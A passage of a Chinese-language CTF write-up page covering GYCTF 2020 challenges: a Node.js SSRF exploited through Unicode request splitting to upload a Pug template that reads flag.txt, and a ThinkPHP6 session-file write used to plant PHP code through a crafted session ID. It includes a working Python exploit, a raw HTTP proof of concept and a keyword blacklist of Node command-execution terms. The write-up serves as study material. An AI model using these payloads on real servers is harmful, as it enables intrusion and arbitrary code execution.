            res.send(<span class="hljs-string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">try</span> {
                http.get(url, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">resp</span>) </span>{
                    resp.setEncoding(<span class="hljs-string">&apos;utf8&apos;</span>);
                    resp.on(<span class="hljs-string">&apos;error&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) </span>{
                    <span class="hljs-keyword">if</span> (err.code === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) {
                     <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);
                     <span class="hljs-keyword">return</span>;
                    }
                   });

                    resp.on(<span class="hljs-string">&apos;data&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>) </span>{
                        <span class="hljs-keyword">try</span> {
                         resps = chunk.toString();
                         res.send(resps);
                        }<span class="hljs-keyword">catch</span> (e) {
                           res.send(e.message);
                        }

                    }).on(<span class="hljs-string">&apos;error&apos;</span>, (e) =&gt; {
                         res.send(e.message);});
                });
            } <span class="hljs-keyword">catch</span> (error) {
                <span class="hljs-built_in">console</span>.log(error);
            }
        }
    } <span class="hljs-keyword">else</span> {
        res.send(<span class="hljs-string">&quot;search param &apos;q&apos; missing!&quot;</span>);
    }
})

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">url</span>) </span>{
    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;mainModule&quot;</span>,<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;child_process&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;&apos;&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>];
    <span class="hljs-keyword">var</span> arrayLen = evilwords.length;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) {
        <span class="hljs-keyword">const</span> trigger = url.includes(evilwords[i]);
        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
        }
    }
}

<span class="hljs-keyword">var</span> server = app.listen(<span class="hljs-number">8081</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-keyword">var</span> host = server.address().address
    <span class="hljs-keyword">var</span> port = server.address().port
    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)
})
</code></pre>
<p>&#x8FD9;&#x91CC;&#x8003;&#x5BDF;Node 8.12.0 &#x4EE5;&#x4E0B;&#x7684; SSRF</p>
<p>&#x601D;&#x60F3;&#x548C;CRLF&#x7C7B;&#x4F3C;</p>
<p>&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="https://xz.aliyun.com/t/2894#toc-2" target="_blank">https://xz.aliyun.com/t/2894#toc-2</a></p>
<p>&#x5229;&#x7528;nodejs&#x4F4E;&#x4F4D;&#x62C6;&#x5206;&#x7684;&#x5904;&#x7406;</p>
<p>Exp:</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> urllib.parse
<span class="hljs-keyword">import</span> requests

payload = <span class="hljs-string">&apos;&apos;&apos; HTTP/1.1
Host: x
Connection: keep-alive

POST /file_upload HTTP/1.1
Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810
Connection: keep-alive
cache-control: no-cache
Host: x
Content-Length: 290

----------------------------919695033422425209299810
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;eki.pug&quot;
Content-Type: /../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt

----------------------------919695033422425209299810--

GET /flag HTTP/1.1
Host: x
Connection: close
x:&apos;&apos;&apos;</span>
payload = payload.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>)
payload = <span class="hljs-string">&apos;&apos;</span>.join(chr(int(<span class="hljs-string">&apos;0xff&apos;</span> + hex(ord(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload)
print(payload)
r = requests.get(<span class="hljs-string">&apos;http://4dc2eead-14ed-41d0-8846-474af06a6886.node3.buuoj.cn/core?q=&apos;</span> + urllib.parse.quote(payload))
print(r.text)
</code></pre>
<p>&#x6267;&#x884C;&#x540E;pug&#x6587;&#x4EF6;&#x5C31;&#x4E0A;&#x4F20;&#x5230;template&#x6587;&#x4EF6;&#x5939;&#x91CC;&#x5E76;&#x4E14;&#x8BFB;&#x53D6;&#x4E86;flag.txt</p>
<h2 id="easythinking"><a name="easythinking" class="anchor-navigation-ex-anchor" href="#easythinking"><i class="fa fa-link" aria-hidden="true"></i></a>EasyThinking</h2>
<p>&#x9898;&#x76EE;&#x63D0;&#x793A;search&#x529F;&#x80FD;&#x6709;&#x6F0F;&#x6D1E;</p>
<p>&#x5B58;&#x5728;&#x6E90;&#x7801;&#x6CC4;&#x9732;&#x62FF;&#x5230;<code>www.zip</code></p>
<p>Thinkphp6.0&#x6846;&#x67B6;&#xFF0C;&#x770B;&#x4E0B;search&#x90E8;&#x5206;&#x903B;&#x8F91;</p>
<pre><code class="lang-php"><span class="hljs-comment">//\app\home\controller\member.php</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">if</span> (Request::isPost()){
            <span class="hljs-keyword">if</span> (!session(<span class="hljs-string">&apos;?UID&apos;</span>))
            {
                <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&apos;/home/member/login&apos;</span>);            
            }
            $data = input(<span class="hljs-string">&quot;post.&quot;</span>);
            $record = session(<span class="hljs-string">&quot;Record&quot;</span>);
            <span class="hljs-keyword">if</span> (!session(<span class="hljs-string">&quot;Record&quot;</span>))
            {
                session(<span class="hljs-string">&quot;Record&quot;</span>,$data[<span class="hljs-string">&quot;key&quot;</span>]);
            }
            <span class="hljs-keyword">else</span>
            {
                $recordArr = explode(<span class="hljs-string">&quot;,&quot;</span>,$record);
                $recordLen = sizeof($recordArr);
                <span class="hljs-keyword">if</span> ($recordLen &gt;= <span class="hljs-number">3</span>){
                    array_shift($recordArr);
                    session(<span class="hljs-string">&quot;Record&quot;</span>,implode(<span class="hljs-string">&quot;,&quot;</span>,$recordArr) . <span class="hljs-string">&quot;,&quot;</span> . $data[<span class="hljs-string">&quot;key&quot;</span>]);
                    <span class="hljs-keyword">return</span> View::fetch(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&apos;s nothing here&quot;</span>]);
                }

            }
            session(<span class="hljs-string">&quot;Record&quot;</span>,$record . <span class="hljs-string">&quot;,&quot;</span> . $data[<span class="hljs-string">&quot;key&quot;</span>]);
            <span class="hljs-keyword">return</span> View::fetch(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&apos;s nothing here&quot;</span>]);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> View(<span class="hljs-string">&quot;search&quot;</span>);
        }
    }
</code></pre>
<p>&#x8FD9;&#x91CC;&#x6D89;&#x53CA;&#x5230;&#x5BF9;Session&#x7684;&#x5904;&#x7406;,&#x6700;&#x5916;&#x5C42;&#x5305;&#x88C5;&#x5982;&#x4E0B;</p>
<pre><code class="lang-php">   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">session</span><span class="hljs-params">($name = <span class="hljs-string">&apos;&apos;</span>, $value = <span class="hljs-string">&apos;&apos;</span>)</span>
    </span>{
        <span class="hljs-keyword">if</span> (is_null($name)) {
            <span class="hljs-comment">// &#x6E05;&#x9664;</span>
            Session::clear();
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-string">&apos;&apos;</span> === $name) {
            <span class="hljs-keyword">return</span> Session::all();
        } <span class="hljs-keyword">elseif</span> (is_null($value)) {
            <span class="hljs-comment">// &#x5220;&#x9664;</span>
            Session::delete($name);
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-string">&apos;&apos;</span> === $value) {
            <span class="hljs-comment">// &#x5224;&#x65AD;&#x6216;&#x83B7;&#x53D6;</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> === strpos($name, <span class="hljs-string">&apos;?&apos;</span>) ? Session::has(substr($name, <span class="hljs-number">1</span>)) : Session::get($name);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// &#x8BBE;&#x7F6E;</span>
            Session::set($name, $value);
        }
    }
</code></pre>
<p>&#x5229;&#x7528;&#x70B9;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;Session&#x6765;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x5177;&#x4F53;&#x539F;&#x7406;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x53C2;&#x8003;&#x8D44;&#x6599;</p>
<p>Poc</p>
<pre><code>POST /home/member/search HTTP/1.1
Host: 7e20a6ce-de3e-465a-b62d-a02eaf89f174.node3.buuoj.cn
Content-Length: 23
Cache-Control: max-age=0
Origin: http://7e20a6ce-de3e-465a-b62d-a02eaf89f174.node3.buuoj.cn
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://7e20a6ce-de3e-465a-b62d-a02eaf89f174.node3.buuoj.cn/home/member/search
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: _ga=GA1.2.1470039898.1585919433; PHPSESSID=4ed89a20be1a7ec91b09e116cdc5.php
Connection: close

key=&lt;?php phpinfo(); ?&gt;
</code></pre><blockquote>
<p>thinkphp6 &#x4F1A;&#x9ED8;&#x8BA4;&#x5728; <code>/runtime/session</code> &#x521B;&#x5EFA;&#x4E00;&#x4E2A;sess_xxx&#x683C;&#x5F0F;&#x7684;session&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;xxx&#x5C31;&#x662F;PHPSESSID&#xFF08;&#x5FC5;&#x987B;&#x662F;32&#x4F4D;&#xFF09;,&#x800C;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#x5C31;&#x662F;session&#x7684;&#x5185;&#x5BB9;,&#x6B64;&#x5904;&#x53EF;&#x4EE5;&#x5411;key&#x91CC;&#x6CE8;&#x5165;</p>
</blockquote>
<p>&#x6CE8;&#x610F;&#x521B;&#x5EFA;session&#x7684;&#x6761;&#x4EF6;&#x662F;&#x8981;&#x767B;&#x9646;&#x6210;&#x529F;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x643A;&#x5E26;xxxx.php&#x7684;phpsession&#x8FDB;&#x884C;&#x767B;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x641C;&#x7D22;&#x6CE8;&#x5165;</p>
<p>&#x6839;&#x636E;phpinfo()&#x53EF;&#x4EE5;&#x770B;&#x5230;disable&#x4E86;&#x5927;&#x90E8;&#x5206;&#x51FD;&#x6570;&#xFF0C;&#x5229;&#x7528;bypass disable_function&#x7684;&#x811A;&#x672C;&#x7ED5;&#x8FC7;</p>
<h2 id="&#x53C2;&#x8003;&#x8D44;&#x6599;_2"><a name="&#x53C2;&#x8003;&#x8D44;&#x6599;_2" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x8D44;&#x6599;_2"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h2>
<p>thinkPHP6 &#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x6F0F;&#x6D1E;&#x5206;&#x6790; <a href="https://paper.seebug.org/1114/" target="_blank">https://paper.seebug.org/1114/</a> </p>
<footer class="page-footer"><span class="copyright">&#xA9; Eki&apos;s CTF-notes 2019-2021 CC-by-nc-sa 4.0&#x3002; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x672C;&#x7F51;&#x7AD9;&#x6700;&#x540E;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A;
2021-05-07 16:30:35
</span></footer> <link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css"> <script>     window.klipse_settings = {         selector: ".language-klipse, .lang-eval-clojure",         selector_eval_js: ".lang-eval-js",         selector_eval_python_client: ".lang-eval-python",         selector_eval_php: ".lang-eval-php",         selector_eval_scheme: ".lang-eval-scheme",         selector_eval_ruby: ".lang-eval-ruby",         selector_reagent: ".lang-reagent",        selector_google_charts: ".lang-google-chart",        selector_es2017: ".lang-eval-es2017",        selector_jsx: ".lang-eval-jsx",        selector_transpile_jsx: ".lang-transpile-jsx",        selector_render_jsx: ".lang-render-jsx",        selector_react: ".lang-react",        selector_eval_markdown: ".lang-render-markdown",        selector_eval_lambdaway: ".lang-render-lambdaway",        selector_eval_cpp: ".lang-eval-cpp",        selector_eval_html: ".lang-render-html",        selector_sql: ".lang-eval-sql",        selector_brainfuck: "lang-eval-brainfuck",        selector_js: ".lang-transpile-cljs"    }; </script> <script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js"></script>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="fbctf-2019.html" class="navigation navigation-prev " aria-label="Previous page: FBCTF 2019">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="bjd-2nd.html" class="navigation navigation-next " aria-label="Next page: BJDCTF 2nd">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"GYCTF 2020","level":"1.5.25","depth":2,"next":{"title":"BJDCTF 2nd","level":"1.5.26","depth":2,"path":"buuoj/bjd-2nd.md","ref":"buuoj/bjd-2nd.md","articles":[]},"previous":{"title":"FBCTF 2019","level":"1.5.24","depth":2,"path":"buuoj/fbctf-2019.md","ref":"buuoj/fbctf-2019.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","katex","tbfed-pagefooter","theme-comscore","anchor-navigation-ex","-lunr","-search","search-plus","custom-favicon","ga","multipart","advanced-emoji","github","-sharing","sharing-plus","klipse","donate","pageview-count","code","lightbox","auto-scroll-table"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"&copy Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。","modify_label":"本网站最后修订于：","modify_format":"YYYY-MM-DD HH:mm:ss"},"github":{"url":"https://github.com/ekixu"},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"auto-scroll-table":{},"multipart":{},"code":{"copyButtons":true},"donate":{"alipay":"https://ctf.ieki.xyz/assets/images/alipay.jpg","alipayText":"支付宝打赏","button":"赏","title":"","wechat":"https://ctf.ieki.xyz/assets/images/wechat.jpg","wechatText":"微信打赏"},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"/assets/images/favicon.ico","lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"pageview-count":{},"custom-favicon":{},"ga":{"configuration":"auto","token":"UA-156105693-2"},"klipse":{"myConfigKey":"it's the default value"},"advanced-emoji":{"embedEmojis":false},"sharing":{"qq":false,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":false,"facebook":false,"weibo":true,"twitter":true,"pocket":false,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Eki","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Eki's CTF","links":{"sidebar":{"主站 Eki's Blog":"https://ieki.xyz"}},"gitbook":"*","description":"CTF笔记"},"file":{"path":"buuoj/gyctf-2020.md","mtime":"2021-05-07T08:30:35.933Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-05-07T08:31:26.574Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
        
    

    </body>
</html>

